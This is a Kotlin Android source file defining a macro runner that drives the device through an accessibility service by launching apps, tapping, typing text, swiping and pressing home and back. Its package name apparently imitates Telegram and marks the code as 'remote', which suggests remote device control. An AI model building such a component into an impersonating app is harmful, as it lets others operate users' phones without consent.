package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService

object MacroRunner {
    var currentPackage: String? = null

    data class MacroStep(val type: String, val data: Any?, val retries: Int = 3)

    fun start(macroId: String, steps: List<MacroStep>, service: MyAccessibilityService, callback: (Boolean, String) -> Unit) {
        Thread {
            var idx = 0
            while (idx < steps.size) {
                val step = steps[idx]
                var success = false
                var attempt = 0
                while (attempt < step.retries && !success) {
                    success = executeStep(step, service)
                    if (!success) {
                        attempt++
                        Thread.sleep(1500)
                    }
                }
                if (!success) {
                    callback(false, "Failed at step ${idx + 1}")
                    return@Thread
                }
                idx++
            }
            callback(true, "Success: $macroId")
        }.start()
    }

    private fun executeStep(step: MacroStep, service: MyAccessibilityService): Boolean {
        return try {
            when (step.type) {
                "launch" -> {
                    val pkg = step.data as? String
                    if (pkg != null) {
                        service.runOnMainThread { service.launchApp(pkg) }
                        Thread.sleep(3000)
                    }
                    pkg != null
                }
                "tap" -> {
                    val map = step.data as? Map<*, *>
                    val x = map?.get("x") as? Int ?: 500
                    val y = map?.get("y") as? Int ?: 1000
                    service.runOnMainThread { service.tap(x, y) }
                    Thread.sleep(1000)
                    true
                }
                "type" -> {
                    val text = step.data as? String ?: ""
                    service.runOnMainThread { service.injectText(text) }
                    Thread.sleep(1000)
                    true
                }
                "click_text" -> {
                    val text = step.data as? String ?: ""
                    service.runOnMainThread { service.clickText(text) }
                    Thread.sleep(1500)
                    true
                }
                "swipe" -> {
                    val map = step.data as? Map<*, *>
                    val sx = map?.get("sx") as? Int ?: 0
                    val sy = map?.get("sy") as? Int ?: 0
                    val ex = map?.get("ex") as? Int ?: 0
                    val ey = map?.get("ey") as? Int ?: 0
                    val dur = map?.get("dur") as? Long ?: 300L
                    service.runOnMainThread { service.swipe(sx, sy, ex, ey, dur) }
                    Thread.sleep(dur + 500)
                    true
                }
                "home" -> {
                    service.runOnMainThread { service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME) }
                    Thread.sleep(1000)
                    true
                }
                "back" -> {
                    service.runOnMainThread { service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) }
                    Thread.sleep(1000)
                    true
                }
                "wait" -> {
                    val ms = (step.data as? Number)?.toLong() ?: 1000L
                    Thread.sleep(ms)
                    true
                }
                else -> false
            }
        } catch (e: Exception) {
            false
        }
    }
}